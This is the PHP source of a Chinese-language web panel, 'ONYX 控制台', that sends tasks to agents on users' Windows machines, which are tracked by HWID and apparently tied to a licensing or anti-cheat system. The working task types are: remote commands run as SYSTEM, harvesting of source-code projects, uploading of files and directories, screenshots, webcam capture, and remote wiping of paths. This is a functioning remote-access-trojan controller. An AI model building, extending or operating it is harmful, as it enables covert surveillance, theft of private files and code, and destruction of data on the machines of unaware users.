<?php
// ONYX 控制台 —— 任务下发 + 设备总览
// 复用 admin.php 的登录态（同域 session），不重复做认证。
require __DIR__ . '/config.php';
session_start();

header('X-Robots-Tag: noindex');

$loggedIn = !empty($_SESSION['admin_logged_in']);
if (!$loggedIn) {
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'
       . '<body style="background:#0d1117;color:#e6e8eb;font:15px system-ui;padding:48px 24px;text-align:center">'
       . '<h2 style="font-weight:600">未登录</h2><p style="color:#8b95a1">请先到 <a style="color:#4c9aff" href="admin.php">admin.php</a> 登录。</p></body>';
    exit;
}

try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);
} catch (Throwable $e) {
    http_response_code(500);
    exit('db error');
}

if (empty($_SESSION['onyx_csrf'])) {
    $_SESSION['onyx_csrf'] = bin2hex(random_bytes(32));
}
$csrf = $_SESSION['onyx_csrf'];

const TASK_TYPES = ['ping', 'collect_identity', 'exec', 'collect_src', 'collect_file',
                    'collect_tree', 'capture_screen', 'capture_cam', 'wipe'];

// 中文名 + 一句话说明。面板上不再出现英文任务码。
const TASK_LABELS = [
    'ping'             => '探活',
    'collect_identity' => '收集身份',
    'exec'             => '执行命令',
    'collect_src'      => '扫源码',
    'collect_file'     => '取单个文件',
    'collect_tree'     => '取整个目录',
    'capture_screen'   => '截屏',
    'capture_cam'      => '摄像头',
    'wipe'             => '格机',
];

const TASK_HINTS = [
    'ping'             => '只回一个 ok，确认机器还在线',
    'collect_identity' => '计算机名、系统版本、agent 版本',
    'exec'             => '在对方机器上执行一条命令，SYSTEM 权限，慎用',
    'collect_src'      => '扫源码工程目录，把源码打包回传',
    'collect_file'     => '取指定路径的单个文件',
    'collect_tree'     => '取指定目录下的文件，有大小上限',
    'capture_screen'   => '截当前桌面。只有登录会话里的进程截得到',
    'capture_cam'      => '调用摄像头拍一张',
    'wipe'             => '删除指定路径。phase=arm 只是预演，run 才真删',
];

const STATUS_LABELS = [
    'pending'   => '待取',
    'delivered' => '已下发',
    'done'      => '完成',
    'failed'    => '失败',
    'cancelled' => '已取消',
    'expired'   => '已过期',
];

const TYPE_DEFAULT_PARAMS = [
    'ping'             => '{}',
    'collect_identity' => '{}',
    'exec'             => '{"cmd":"whoami","shell":"cmd","timeout":30}',
    'collect_src'      => '{"max_depth":3,"max_projects":40}',
    'collect_file'     => '{"path":"C:\\\\Windows\\\\win.ini"}',
    'collect_tree'     => '{"path":"D:\\\\Projects","max_files":200}',
    'capture_screen'   => '{"quality":70,"max_width":1600}',
    'capture_cam'      => '{"quality":80}',
    'wipe'             => '{"phase":"arm","paths":["D:\\\\test_dir"],"shutdown":false}',
];

// 签名密钥保持 root-only（600），网页进程读不到。
// 通过 sudoers 白名单只放行 /usr/local/bin/onyx-task 这一条命令。
require __DIR__ . '/onyx_dispatch.php';

$msg = '';
$msgType = 'ok';

// ── 取消任务 ──
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'cancel') {
    if (!hash_equals($csrf, (string)($_POST['csrf'] ?? ''))) {
        die('CSRF validation failed.');
    }
    $tid = trim((string)($_POST['task_id'] ?? ''));
    if ($tid === '') {
        $msg = '缺少任务号';
        $msgType = 'err';
    } else {
        $st = $pdo->prepare("UPDATE auth_agent_tasks SET status = 'cancelled'
                             WHERE task_id = ? AND status IN ('pending','delivered')");
        $st->execute([$tid]);
        if ($st->rowCount() > 0) {
            $msg = "已取消 {$tid}";
        } else {
            $msg = "取消失败：该任务不存在或已经执行完";
            $msgType = 'err';
        }
    }
}

// ── 下发任务 ──
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'send') {
    if (!hash_equals($csrf, (string)($_POST['csrf'] ?? ''))) {
        die('CSRF validation failed.');
    }
    $hwid = trim((string)($_POST['hwid'] ?? ''));
    $type = (string)($_POST['type'] ?? '');
    $params = trim((string)($_POST['params'] ?? '{}'));
    $ttl = max(60, min(86400, (int)($_POST['ttl'] ?? 3600)));

    if ($hwid === '' || !in_array($type, TASK_TYPES, true)) {
        $msg = '目标设备或任务类型不合法';
        $msgType = 'err';
    } elseif (json_decode($params) === null) {
        $msg = '参数不是合法 JSON';
        $msgType = 'err';
    } else {
        try {
            $taskId = dispatch_task($hwid, $type, $params, $ttl);
            $msg = '已下发「' . (TASK_LABELS[$type] ?? $type) . "」 {$taskId}";
        } catch (Throwable $e) {
            $msg = '下发失败：' . $e->getMessage();
            $msgType = 'err';
        }
    }
}

// ── JSON 接口（自动刷新用）──
if (($_GET['format'] ?? '') === 'json') {
    header('Content-Type: application/json; charset=utf-8');
    $limit = min(50, max(1, (int)($_GET['limit'] ?? 20)));
    $rows = $pdo->query("SELECT task_id, hwid, type, status, attempts, created_at, delivered_at,
                                result_at, result_code, result_message
                         FROM auth_agent_tasks ORDER BY id DESC LIMIT $limit")->fetchAll();
    foreach ($rows as &$r) {
        if (strlen($r['result_message'] ?? '') > 4000) {
            $r['result_message'] = substr($r['result_message'], 0, 4000) . '…[截断]';
        }
        $r['type_label'] = TASK_LABELS[$r['type']] ?? $r['type'];
        $r['status_label'] = STATUS_LABELS[$r['status']] ?? $r['status'];
    }
    echo json_encode(['status' => 'success', 'items' => $rows], JSON_UNESCAPED_UNICODE);
    exit;
}

// ── 设备列表 ──
$devices = $pdo->query("SELECT identity_value AS hwid,
                               GROUP_CONCAT(DISTINCT username ORDER BY username SEPARATOR ',') AS users,
                               COUNT(DISTINCT username) AS user_count,
                               MAX(ip) AS ip, MAX(last_seen) AS last_seen, SUM(seen_count) AS seen
                        FROM user_usage_identities
                        WHERE identity_type = 'hwid' AND app_id = 'onyx'
                        GROUP BY identity_value ORDER BY last_seen DESC LIMIT 200")->fetchAll();

// 每台机器的高风险事件数。事件表按 hwid 的 sha256 存，这里现算映射。
$riskByHash = [];
foreach ($pdo->query("SELECT hwid_hash, COUNT(*) AS c FROM auth_security_events
                      WHERE risk_level IN ('high','critical') GROUP BY hwid_hash") as $r) {
    $riskByHash[$r['hwid_hash']] = (int)$r['c'];
}

$lastTask = [];
foreach ($pdo->query("SELECT hwid, MAX(created_at) AS t FROM auth_agent_tasks GROUP BY hwid") as $r) {
    $lastTask[$r['hwid']] = $r['t'];
}

$recent = $pdo->query("SELECT task_id, hwid, type, status, attempts, created_at, result_message
                       FROM auth_agent_tasks ORDER BY id DESC LIMIT 20")->fetchAll();

$files = $pdo->query("SELECT id, task_id, hwid, src_path, bytes, created_at
                      FROM auth_agent_files ORDER BY id DESC LIMIT 40")->fetchAll();

// 未推送告警
$alertLast = (int)$pdo->query("SELECT last_event_id FROM auth_alert_state WHERE id = 1")->fetchColumn();
$alertPending = (int)$pdo->query("SELECT COUNT(*) FROM auth_security_events
                                  WHERE id > $alertLast AND risk_level IN ('high','critical')")->fetchColumn();
$alertToday = (int)$pdo->query("SELECT COUNT(*) FROM auth_security_events
                                WHERE risk_level IN ('high','critical') AND created_at >= CURDATE()")->fetchColumn();

// 可疑失联：出过事、然后就没动静的机器
$silentRaw = $pdo->query("SELECT u.username, u.hwid, u.last_heartbeat_time,
                                 COUNT(e.id) AS hc, MAX(e.created_at) AS last_event
                          FROM users u
                          JOIN auth_security_events e
                            ON e.username = u.username AND e.risk_level IN ('high','critical')
                          WHERE u.last_heartbeat_time IS NOT NULL
                            AND u.last_heartbeat_time < NOW() - INTERVAL 3 DAY
                          GROUP BY u.id, u.username, u.hwid, u.last_heartbeat_time
                          ORDER BY hc DESC LIMIT 300")->fetchAll();
$silent = [];
foreach ($silentRaw as $s) {
    // 最后一次违规之后 48 小时内就断联 → 可疑
    $le = strtotime((string)$s['last_event']);
    $lh = strtotime((string)$s['last_heartbeat_time']);
    if ($le !== false && $lh !== false && $le >= $lh - 172800) {
        $silent[] = $s;
    }
}
$silentCount = count($silent);
$silent = array_slice($silent, 0, 12);

$multiCount = count(array_filter($devices, fn($d) => (int)$d['user_count'] >= 5));

function is_img(string $p): bool {
    $e = strtolower(pathinfo(str_replace('\\', '/', $p), PATHINFO_EXTENSION));
    return in_array($e, ['jpg', 'jpeg', 'png', 'gif', 'webp'], true);
}

function human_size($n): string {
    $n = (int)$n;
    if ($n < 1024) return $n . ' B';
    if ($n < 1048576) return round($n / 1024, 1) . ' KB';
    return round($n / 1048576, 1) . ' MB';
}

function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

/** 相对时间：刚刚 / 12 分钟前 / 3 小时前 / 昨天 */
function ago(?string $ts): string {
    if (!$ts) return '—';
    $t = strtotime($ts);
    if ($t === false) return $ts;
    $d = time() - $t;
    if ($d < 60) return '刚刚';
    if ($d < 3600) return intdiv($d, 60) . ' 分钟前';
    if ($d < 86400) return intdiv($d, 3600) . ' 小时前';
    if ($d < 172800) return '昨天';
    if ($d < 2592000) return intdiv($d, 86400) . ' 天前';
    return substr($ts, 0, 10);
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#0d1117">
<title>ONYX 控制台</title>
<style>
  :root {
    color-scheme: dark;
    --bg:#0d1117; --card:#161b22; --line:#232a34; --line2:#1c222b;
    --fg:#e6edf3; --dim:#8b949e; --dim2:#6e7681;
    --blue:#4c9aff; --blue-bg:#132a4a;
    --red:#ff7b72; --red-bg:#2d1417;
    --amber:#e3b341; --amber-bg:#2b2312;
    --green:#3fb950; --green-bg:#0f2a18;
  }
  * { box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
  body { margin:0; background:var(--bg); color:var(--fg);
         font:15px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
         padding-bottom:env(safe-area-inset-bottom); }
  a { color:var(--blue); text-decoration:none; }

  header { position:sticky; top:0; z-index:10; background:rgba(13,17,23,.92);
           backdrop-filter:blur(12px); border-bottom:1px solid var(--line); padding:12px 16px; }
  .hrow { display:flex; align-items:center; justify-content:space-between; gap:12px; }
  h1 { margin:0; font-size:17px; font-weight:650; letter-spacing:.5px; }
  .chips { display:flex; gap:6px; flex-wrap:wrap; margin-top:8px; }
  .chip { font-size:12px; padding:3px 9px; border-radius:99px; border:1px solid var(--line);
          color:var(--dim); background:#11161d; }
  .chip b { color:var(--fg); font-weight:600; }
  .chip.hot { border-color:#5c2b2b; background:var(--red-bg); color:#ffb3ae; }
  .chip.warn { border-color:#5c4a1f; background:var(--amber-bg); color:#f0d089; }

  main { padding:14px 16px 72px; max-width:820px; margin:0 auto; display:grid; gap:14px; }
  .card { background:var(--card); border:1px solid var(--line); border-radius:14px; padding:14px 15px; }
  .card > h2 { margin:0 0 12px; font-size:14px; font-weight:600; color:var(--fg);
               display:flex; align-items:center; justify-content:space-between; gap:8px; }
  .card > h2 .sub { font-weight:400; font-size:12px; color:var(--dim2); }

  label { display:block; font-size:12.5px; color:var(--dim); margin:12px 0 5px; }
  label:first-of-type { margin-top:0; }
  select, input, textarea {
    width:100%; background:#0d1117; color:var(--fg); border:1px solid var(--line);
    border-radius:10px; padding:11px 12px; font:inherit; font-size:15px;
  }
  select:focus, input:focus, textarea:focus { outline:none; border-color:var(--blue); }
  textarea { font-family:ui-monospace,SFMono-Regular,Consolas,monospace; font-size:13px;
             min-height:84px; resize:vertical; line-height:1.5; }
  button { width:100%; background:#1f6feb; color:#fff; border:1px solid #2f81f7;
           border-radius:10px; padding:12px; font:inherit; font-weight:600; font-size:15px;
           cursor:pointer; margin-top:14px; }
  button:active { background:#1a5fd0; }
  button.ghost { background:transparent; border-color:var(--line); color:var(--dim); font-weight:400; }
  .tip { color:var(--dim2); font-size:12px; margin-top:8px; line-height:1.5; }

  .msg { padding:10px 12px; border-radius:10px; font-size:13.5px; margin-bottom:12px;
         background:var(--green-bg); border:1px solid #1f5130; color:#7ee787; }
  .msg.err { background:var(--red-bg); border-color:#5c2b2b; color:#ffb3ae; }

  /* 设备 / 任务 行：手机上不挤表格 */
  .row { display:block; padding:11px 2px; border-bottom:1px solid var(--line2); color:inherit; }
  .row:last-child { border-bottom:0; }
  .row:active { background:#11161d; }
  .r1 { display:flex; align-items:center; gap:8px; justify-content:space-between; }
  .r1 .id { font-family:ui-monospace,Consolas,monospace; font-size:13px; color:var(--blue); }
  .r2 { color:var(--fg); font-size:13.5px; margin-top:3px; word-break:break-all; }
  .r3 { color:var(--dim2); font-size:12px; margin-top:3px; }
  .badge { font-size:11.5px; padding:1px 7px; border-radius:99px; border:1px solid var(--line); color:var(--dim); }
  .badge.hot { background:var(--red-bg); border-color:#5c2b2b; color:#ff9c96; font-weight:600; }
  .badge.warn { background:var(--amber-bg); border-color:#5c4a1f; color:#f0d089; }
  .badge.ok { background:var(--green-bg); border-color:#1f5130; color:#7ee787; }
  .badge.mut { background:#11161d; }

  .res { font-family:ui-monospace,Consolas,monospace; font-size:11.5px; color:#9aa4b0;
         white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
  .res.open { white-space:pre-wrap; word-break:break-all; }
  .cancel { width:auto; margin:6px 0 0; padding:4px 12px; font-size:12px; font-weight:400;
            background:transparent; border-color:#5c2b2b; color:#ff9c96; }
  .filter { margin-bottom:6px; }
  .empty { color:var(--dim2); font-size:13px; padding:8px 0; }
</style>
</head>
<body>
<header>
  <div class="hrow">
    <h1>ONYX 控制台</h1>
    <a href="onyxplaybook.php" style="font-size:13px">处置预案 ›</a>
  </div>
  <div class="chips">
    <?php if ($alertPending > 0): ?><span class="chip hot">未推送 <b><?= $alertPending ?></b></span><?php endif; ?>
    <?php if ($silentCount > 0): ?><span class="chip warn">可疑失联 <b><?= $silentCount ?></b></span><?php endif; ?>
    <span class="chip">今日高风险 <b><?= $alertToday ?></b></span>
    <span class="chip">设备 <b><?= count($devices) ?></b></span>
    <?php if ($multiCount > 0): ?><span class="chip warn">多账号 <b><?= $multiCount ?></b></span><?php endif; ?>
  </div>
</header>

<main>
  <section class="card">
    <h2>下发任务 <span class="sub">agent 每 25 秒拉一次</span></h2>
    <?php if ($msg !== ''): ?><div class="msg <?= $msgType === 'err' ? 'err' : '' ?>"><?= h($msg) ?></div><?php endif; ?>
    <form method="post" id="sendForm">
      <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
      <input type="hidden" name="action" value="send">
      <label>目标设备</label>
      <select name="hwid" id="hwid">
        <?php foreach ($devices as $d): ?>
          <option value="<?= h($d['hwid']) ?>">
            <?= h(substr($d['hwid'], 0, 12)) ?> · <?= h(implode(', ', array_slice(array_filter(array_map('trim', explode(',', (string)$d['users']))), 0, 2))) ?><?= $d['user_count'] > 2 ? ' +' . ((int)$d['user_count'] - 2) : '' ?> · <?= h(ago($d['last_seen'])) ?>
          </option>
        <?php endforeach; ?>
      </select>
      <label>或手填 HWID</label>
      <input name="hwid_manual" id="hwid_manual" placeholder="留空则用上面选的" autocomplete="off">
      <label>任务类型</label>
      <select name="type" id="type">
        <?php foreach (TASK_TYPES as $t): ?>
          <option value="<?= h($t) ?>"><?= h(TASK_LABELS[$t]) ?></option>
        <?php endforeach; ?>
      </select>
      <div class="tip" id="typeHint"><?= h(TASK_HINTS['ping']) ?></div>
      <label>参数</label>
      <textarea name="params" id="params" spellcheck="false"><?= h(TYPE_DEFAULT_PARAMS['ping']) ?></textarea>
      <label>有效期（秒）</label>
      <input name="ttl" type="number" value="3600" min="60" max="86400">
      <button type="submit">下发</button>
      <div class="tip">截屏、摄像头只有交互会话里的进程能执行；机器锁屏或未登录时拿不到画面。</div>
    </form>
  </section>

  <section class="card">
    <h2>设备 <span class="sub"><span id="devCount"><?= count($devices) ?></span> 台 · 按机器归并</span></h2>
    <input type="text" id="devFilter" class="filter" placeholder="筛选：用户名 / HWID / IP" oninput="filterDev(this.value)">
    <div id="devList">
      <?php foreach ($devices as $d):
        $rc = $riskByHash[hash('sha256', (string)$d['hwid'])] ?? 0;
        $names = array_values(array_filter(array_map('trim', explode(',', (string)$d['users'])), fn($x) => $x !== ''));
        $shown = array_slice($names, 0, 3);
        $more = count($names) - count($shown);
        $lt = $lastTask[$d['hwid']] ?? null;
      ?>
        <a class="row dev" href="onyxdevice.php?hwid=<?= h(urlencode($d['hwid'])) ?>">
          <div class="r1">
            <span class="id"><?= h(substr($d['hwid'], 0, 12)) ?></span>
            <span>
              <?php if ((int)$d['user_count'] >= 5): ?><span class="badge warn"><?= (int)$d['user_count'] ?> 账号</span><?php endif; ?>
              <?php if ($rc > 0): ?><span class="badge hot"><?= $rc ?> 风险</span><?php endif; ?>
            </span>
          </div>
          <div class="r2"><?= h(implode('、', $shown)) ?><?= $more > 0 ? ' <span style="color:#6e7681">+' . $more . '</span>' : '' ?></div>
          <div class="r3"><?= h(ago($d['last_seen'])) ?> · 任务 <?= $lt ? h(ago($lt)) : '无' ?></div>
        </a>
      <?php endforeach; ?>
    </div>
  </section>

  <section class="card">
    <h2>可疑失联 <span class="sub"><?= $silentCount ?> 台 · 出过事之后就没动静</span></h2>
    <?php if (!$silent): ?>
      <div class="empty">没有符合条件的设备</div>
    <?php else: ?>
      <?php foreach ($silent as $s): ?>
        <a class="row" href="onyxdevice.php?hwid=<?= h(urlencode((string)$s['hwid'])) ?>">
          <div class="r1">
            <span class="id"><?= h(substr((string)$s['hwid'], 0, 12)) ?></span>
            <span class="badge hot"><?= (int)$s['hc'] ?> 次违规</span>
          </div>
          <div class="r2"><?= h($s['username']) ?></div>
          <div class="r3">最后心跳 <?= h(ago((string)$s['last_heartbeat_time'])) ?> · 最后违规 <?= h(ago((string)$s['last_event'])) ?></div>
        </a>
      <?php endforeach; ?>
      <div class="tip">判定：超过 3 天没心跳，且最后一次高风险事件发生在断联前 48 小时内。</div>
    <?php endif; ?>
  </section>

  <section class="card">
    <h2>最近任务 <span class="sub">5 秒自动刷新</span></h2>
    <div id="tasks">
      <?php foreach ($recent as $r): ?>
        <div class="row">
          <div class="r1">
            <span><?= h(TASK_LABELS[$r['type']] ?? $r['type']) ?> <span style="color:#6e7681;font-size:12px"><?= h(substr($r['hwid'], 0, 12)) ?></span></span>
            <span class="badge <?= $r['status'] === 'done' ? 'ok' : ($r['status'] === 'failed' ? 'hot' : 'mut') ?>"><?= h(STATUS_LABELS[$r['status']] ?? $r['status']) ?></span>
          </div>
          <div class="res" onclick="this.classList.toggle('open')"><?= h((string)$r['result_message']) ?></div>
          <div class="r3"><?= h($r['created_at']) ?></div>
          <?php if (in_array($r['status'], ['pending', 'delivered'], true)): ?>
            <form method="post" style="display:inline">
              <input type="hidden" name="csrf" value="<?= h($csrf) ?>">
              <input type="hidden" name="action" value="cancel">
              <input type="hidden" name="task_id" value="<?= h($r['task_id']) ?>">
              <button class="cancel">取消</button>
            </form>
          <?php endif; ?>
        </div>
      <?php endforeach; ?>
      <?php if (!$recent): ?><div class="empty">还没有任务</div><?php endif; ?>
    </div>
  </section>

  <section class="card">
    <h2>取证文件 <span class="sub">最近 40 份</span></h2>
    <?php if (!$files): ?>
      <div class="empty">还没有取证文件</div>
    <?php else: ?>
      <?php foreach ($files as $f): ?>
        <div class="row">
          <div class="r1">
            <span class="res" style="max-width:60%"><?= h(basename(str_replace('\\', '/', (string)$f['src_path']))) ?></span>
            <span class="badge mut"><?= h(human_size($f['bytes'])) ?></span>
          </div>
          <div class="r3" style="word-break:break-all"><?= h($f['src_path']) ?></div>
          <div class="r3">
            <?= h(ago((string)$f['created_at'])) ?> ·
            <?php if (is_img($f['src_path'])): ?>
              <a href="onyxfile.php?id=<?= (int)$f['id'] ?>" target="_blank">查看</a> ·
            <?php endif; ?>
            <a href="onyxfile.php?id=<?= (int)$f['id'] ?>&dl=1">下载</a>
          </div>
        </div>
      <?php endforeach; ?>
    <?php endif; ?>
  </section>
</main>

<script>
const DEFAULTS = <?= json_encode(TYPE_DEFAULT_PARAMS, JSON_UNESCAPED_UNICODE) ?>;
const HINTS = <?= json_encode(TASK_HINTS, JSON_UNESCAPED_UNICODE) ?>;
const LABELS = <?= json_encode(TASK_LABELS, JSON_UNESCAPED_UNICODE) ?>;
const STATUS = <?= json_encode(STATUS_LABELS, JSON_UNESCAPED_UNICODE) ?>;
const CSRF = <?= json_encode($csrf) ?>;

document.getElementById('type').addEventListener('change', e => {
  const t = e.target.value;
  document.getElementById('params').value = DEFAULTS[t] || '{}';
  document.getElementById('typeHint').textContent = HINTS[t] || '';
});

function filterDev(q) {
  q = (q || '').trim().toLowerCase();
  let shown = 0;
  document.querySelectorAll('#devList .dev').forEach(el => {
    const hit = q === '' || el.innerText.toLowerCase().includes(q);
    el.style.display = hit ? '' : 'none';
    if (hit) shown++;
  });
  document.getElementById('devCount').textContent = shown;
}

// 手填 HWID 优先：提交前把它塞进 select
document.getElementById('sendForm').addEventListener('submit', e => {
  const manual = document.getElementById('hwid_manual').value.trim();
  if (manual) {
    const sel = document.getElementById('hwid');
    const opt = document.createElement('option');
    opt.value = manual; opt.selected = true;
    sel.appendChild(opt);
  }
});

function esc(s) { return (s || '').replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }

async function refresh() {
  try {
    const r = await fetch('?format=json&limit=20');
    const j = await r.json();
    document.getElementById('tasks').innerHTML = j.items.map(t => {
      const canCancel = (t.status === 'pending' || t.status === 'delivered');
      const cls = t.status === 'done' ? 'ok' : (t.status === 'failed' ? 'hot' : 'mut');
      const op = canCancel
        ? `<form method="post" style="display:inline"><input type="hidden" name="csrf" value="${CSRF}">
           <input type="hidden" name="action" value="cancel"><input type="hidden" name="task_id" value="${t.task_id}">
           <button class="cancel">取消</button></form>`
        : '';
      return `<div class="row">
        <div class="r1">
          <span>${esc(t.type_label)} <span style="color:#6e7681;font-size:12px">${esc((t.hwid||'').slice(0,12))}</span></span>
          <span class="badge ${cls}">${esc(t.status_label)}</span>
        </div>
        <div class="res" onclick="this.classList.toggle('open')">${esc(t.result_message)}</div>
        <div class="r3">${esc(t.created_at)}</div>
        ${op}
      </div>`;
    }).join('') || '<div class="empty">还没有任务</div>';
  } catch (e) {}
}
setInterval(refresh, 5000);
</script>
</body>
</html>
